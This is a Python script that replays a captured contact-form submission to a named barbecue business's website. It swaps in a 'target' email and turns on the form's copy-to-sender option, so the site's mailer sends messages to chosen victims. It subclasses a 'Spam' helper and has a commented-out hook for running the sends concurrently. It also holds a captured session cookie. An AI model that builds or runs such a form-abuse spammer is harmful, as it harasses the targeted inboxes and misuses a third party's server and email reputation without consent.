import requests

import module.config

cookies = {
    'PHPSESSID': 'h874df5sbuvihok07lf9r610d0',
    '__utma': '46946234.89919484.1677763116.1677763116.1677763116.1',
    '__utmc': '46946234',
    '__utmz': '46946234.1677763116.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
    '__utmt': '1',
    '__utmb': '46946234.5.9.1677763340841',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary6NhgtJzH85wJv2Tv',
    # 'Cookie': 'PHPSESSID=h874df5sbuvihok07lf9r610d0; __utma=46946234.89919484.1677763116.1677763116.1677763116.1; __utmc=46946234; __utmz=46946234.1677763116.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; __utmb=46946234.5.9.1677763340841',
    'Origin': 'http://www.lovelandlovesbbq.com',
    'Pragma': 'no-cache',
    'Proxy-Connection': 'keep-alive',
    'Referer': 'http://www.lovelandlovesbbq.com/Pages/Contact.php',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

s = 'Thank you'

from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoudary6NhgtJzH85wJv2Tv\r\nContent-Disposition: form-data; name="name"\r\n\r\n test\r\n------WebKitFormBoundary6NhgtJzH85wJv2Tv\r\nContent-Disposition: form-data; name="email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundary6NhgtJzH85wJv2Tv\r\nContent-Disposition: form-data; name="copy_sender"\r\n\r\n1\r\n------WebKitFormBoundary6NhgtJzH85wJv2Tv\r\nContent-Disposition: form-data; name="subject"\r\n\r\n test\r\n------WebKitFormBoundary6NhgtJzH85wJv2Tv\r\nContent-Disposition: form-data; name="message"\r\n\r\n<p>\xa0test</p>\r\n------WebKitFormBoundary6NhgtJzH85wJv2Tv\r\nContent-Disposition: form-data; name="attachment0"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundary6NhgtJzH85wJv2Tv\r\nContent-Disposition: form-data; name="memberManageSubmit"\r\n\r\nSend Mail\r\n------WebKitFormBoundary6NhgtJzH85wJv2Tv\r\nContent-Disposition: form-data; name="memberManageCancel"\r\n\r\n\r\n------WebKitFormBoundary6NhgtJzH85wJv2Tv\r\nContent-Disposition: form-data; name="postHandlerSendGroupMail"\r\n\r\nsendGroupMailPost\r\n------WebKitFormBoundary6NhgtJzH85wJv2Tv\r\nContent-Disposition: form-data; name="editorNum"\r\n\r\n0\r\n------WebKitFormBoundary6NhgtJzH85wJv2Tv\r\nContent-Disposition: form-data; name="sendtoSiteContact"\r\n\r\n1\r\n------WebKitFormBoundary6NhgtJzH85wJv2Tv\r\nContent-Disposition: form-data; name="__formSerialNumber__"\r\n\r\n8V9ViWz0XV5SSraMj16u4rp3AYrGX7\r\n------WebKitFormBoundary6NhgtJzH85wJv2Tv\r\nContent-Disposition: form-data; name="sendtogroup"\r\n\r\n5\r\n------WebKitFormBoundary6NhgtJzH85wJv2Tv\r\nContent-Disposition: form-data; name="usetogroupname"\r\n\r\n1\r\n------WebKitFormBoundary6NhgtJzH85wJv2Tv--\r\n'
        data = data.replace('wezxasqw@gmail.com', target)
        # data = data.replace('test', self.get_text())

        response = requests.post(
            'http://www.lovelandlovesbbq.com/Pages/Contact.php',
            cookies=cookies,
            headers=headers,
            data=data.encode(),
            verify=False,
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    # if res:
    #     spam.run_concurrently()


if __name__ == '__main__':
    main()
